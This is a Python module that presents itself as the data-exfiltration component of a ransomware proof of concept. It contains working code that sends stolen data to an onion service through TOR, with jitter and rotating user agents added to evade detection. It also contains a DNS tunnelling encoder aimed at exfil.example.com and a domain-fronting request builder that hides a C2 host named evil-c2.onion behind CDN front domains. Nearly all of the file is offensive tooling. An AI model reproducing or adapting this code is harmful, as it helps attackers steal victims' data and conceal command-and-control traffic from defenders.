#!/usr/bin/env python3
"""
TOR-based exfiltration module for ransomware PoC.
Routes traffic through TOR network for anonymity.
"""

import base64
import json
import os
import random
import socket
import ssl
import time
from typing import Dict, Optional, Tuple

import requests

from ransomware.logging import logger


class TorExfiltrator:
    """
    Exfiltrate data through TOR network.
    Requires TOR service to be running locally.
    """

    TOR_SOCKS_PROXY = "socks5h://127.0.0.1:9050"
    TOR_HTTP_PROXY = "http://127.0.0.1:8123"  # Privoxy

    def __init__(self):
        self.tor_available = self._check_tor_connection()
        self.session = requests.Session()

    def _check_tor_connection(self) -> bool:
        """Check if TOR is available."""
        try:
            # Try to connect to TOR SOCKS proxy
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex(('127.0.0.1', 9050))
            sock.close()
            return result == 0
        except Exception:
            return False

    def _get_tor_session(self) -> requests.Session:
        """Create session with TOR proxy."""
        session = requests.Session()

        # Try to use requests[socks] if available
        try:
            session.proxies = {
                'http': self.TOR_SOCKS_PROXY,
                'https': self.TOR_SOCKS_PROXY
            }
        except Exception:
            logger.warning("TOR SOCKS proxy not available")

        return session

    def _new_identity(self) -> bool:
        """
        Request new TOR identity.
        Requires control port to be enabled.
        """
        try:
            # Connect to TOR control port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect(('127.0.0.1', 9051))

            # Authenticate (cookie auth by default)
            # In real scenario, would need proper auth
            sock.send(b'SIGNAL NEWNYM\r\n')
            response = sock.recv(1024)
            sock.close()

            if b'OK' in response:
                time.sleep(5)  # Wait for new circuit
                return True

        except Exception:
            pass

        return False

    def exfiltrate_via_tor(self, data: Dict, onion_url: str) -> bool:
        """
        Exfiltrate data to onion service.
        """
        if not self.tor_available:
            logger.error("TOR not available for exfiltration")
            return False

        try:
            session = self._get_tor_session()

            # Add jitter to avoid pattern detection
            time.sleep(random.uniform(1, 5))

            headers = {
                'User-Agent': self._get_random_ua(),
                'Content-Type': 'application/json',
            }

            response = session.post(
                onion_url,
                headers=headers,
                json=data,
                timeout=60
            )

            return response.status_code == 200

        except Exception as e:
            logger.error(f"TOR exfiltration error: {e}")
            return False

    def _get_random_ua(self) -> str:
        """Get random user agent."""
        uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        ]
        return random.choice(uas)


class DNSTunnel:
    """
    DNS tunneling for data exfiltration.
    Encodes data in DNS queries.
    """

    def __init__(self, domain: str = "exfil.example.com"):
        self.domain = domain
        self.chunk_size = 63  # Max DNS label length
        self.max_labels = 4   # Labels per query

    def encode_data(self, data: bytes) -> List[str]:
        """
        Encode binary data into DNS query strings.
        """
        # Base32 encode (DNS-safe)
        encoded = base64.b32encode(data).decode().rstrip('=')

        # Split into chunks
        chunks = []
        for i in range(0, len(encoded), self.chunk_size):
            chunk = encoded[i:i + self.chunk_size]
            chunks.append(chunk.lower())

        return chunks

    def create_dns_query(self, data: bytes, session_id: str) -> List[str]:
        """
        Create DNS query names for exfiltration.
        Returns list of full query names.
        """
        chunks = self.encode_data(data)
        queries = []

        for i, chunk in enumerate(chunks):
            # Format: chunk.session-id.seq.domain
            query = f"{chunk}.{session_id}.{i}.{self.domain}"
            queries.append(query)

        return queries

    def simulate_exfiltration(self, data: Dict) -> int:
        """
        Simulate DNS exfiltration (educational).
        Returns number of DNS queries that would be sent.
        """
        json_data = json.dumps(data).encode()
        compressed = base64.b64encode(json_data)

        queries = self.create_dns_query(compressed, "sess123")

        logger.info(f"DNS exfiltration: {len(queries)} queries required")
        return len(queries)


class DomainFronting:
    """
    Domain fronting for C2 communication.
    Uses CDN to mask true destination.
    """

    CDN_HOSTS = {
        'cloudfront': {
            'front': 'd1g91r29c80o0s.cloudfront.net',
            'actual': 'evil-c2.onion',
        },
        'azure': {
            'front': 'example.azureedge.net',
            'actual': 'evil-c2.onion',
        },
    }

    def __init__(self, cdn: str = 'cloudfront'):
        self.config = self.CDN_HOSTS.get(cdn, self.CDN_HOSTS['cloudfront'])

    def create_request(self, data: Dict) -> Dict:
        """
        Create HTTP request with domain fronting headers.
        """
        headers = {
            'Host': self.config['actual'],  # True destination
            'X-Forwarded-Host': self.config['actual'],
        }

        return {
            'url': f"https://{self.config['front']}/api/v1/data",
            'headers': headers,
            'data': data,
        }


if __name__ == "__main__":
    print("TOR Exfiltration Test")
    print("=" * 60)

    # Check TOR
    tor = TorExfiltrator()
    print(f"[*] TOR available: {tor.tor_available}")

    # DNS tunnel test
    print("\n[*] Testing DNS tunnel encoding...")
    dns = DNSTunnel()
    test_data = b"test data for exfiltration - sensitive information"
    queries = dns.create_dns_query(test_data, "abc123")
    print(f"[+] Would send {len(queries)} DNS queries")
    for q in queries[:3]:
        print(f"    {q[:60]}...")

    # Domain fronting test
    print("\n[*] Testing domain fronting...")
    fronting = DomainFronting()
    req = fronting.create_request({"test": "data"})
    print(f"[+] Front domain: {fronting.config['front']}")
    print(f"[+] Actual destination: {fronting.config['actual']}")
    print(f"[+] Headers: {req['headers']}")
